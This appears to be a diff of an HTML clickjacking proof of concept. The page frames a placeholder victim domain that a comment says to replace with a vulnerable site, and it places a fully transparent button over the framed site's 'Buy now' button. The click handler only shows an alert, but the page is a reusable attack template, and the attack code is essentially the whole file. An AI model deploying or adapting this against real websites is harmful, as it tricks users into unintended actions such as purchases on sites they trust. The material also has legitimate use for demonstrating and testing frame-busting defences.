@@ -1,29 +1,65 @@
-<!doctype html>
+<!DOCTYPE html>
 <html>
-
+<!--
+	Author: Johto Robbie
+	My Website: https://vnhackernews.com/
+	Fanpage: https://www.facebook.com/VNHackerNews/
+	Licenses: https://opensource.org/licenses/MIT
+	
+	Change http://domainexploit.name to vulnerability domain 
+-->
 <head>
   <meta charset="UTF-8">
-</head>
-
-<body>
-
+  <title>Clickjacking Demo</title>
   <style>
+    .container {
+      position: relative;
+      width: 880px;
+      height: 445px;
+      margin: 50px auto;
+      border: 2px solid #ccc;
+    }
+
     iframe {
-      
       position: absolute;
-      top: 5px;
-      left: -14px;
-      opacity: 0.5;
+      width: 100%;
+      height: 100%;
+      top: 0;
+      left: 0;
       z-index: 1;
+      opacity: 0.9;
+    }
+
+    .fake-buy-button {
+      position: absolute;
+      top: 300px;  /* vị trí nút trên site */
+      left: 500px; /* vị trí nút trên site */
+      width: 120px;
+      height: 50px;
+      opacity: 0; /* ẩn hoàn toàn */
+      z-index: 2;
+      cursor: pointer;
+    }
+
+    .label {
+      text-align: center;
+      margin-top: 30px;
+      font-size: 24px;
+      font-weight: bold;
     }
   </style>
+</head>
+<body>
 
-<div align="center">Demo Clickjacking</div>
+<div class="label">Demo Clickjacking</div>
 
-  <!-- The url from the victim site -->
-<iframe height="445" width="880" src="hacker.html"></iframe>
+<div class="container">
+  <!-- iframe site nạn nhân -->
+  <iframe src="http://domainexploit.name"></iframe>
 
-
+  <!-- nút trong suốt đè lên vị trí "Buy now" button -->
+  <button class="fake-buy-button" onclick="alert('Clickjacked!')"></button>
+</div>
 
 </body>
 </html>
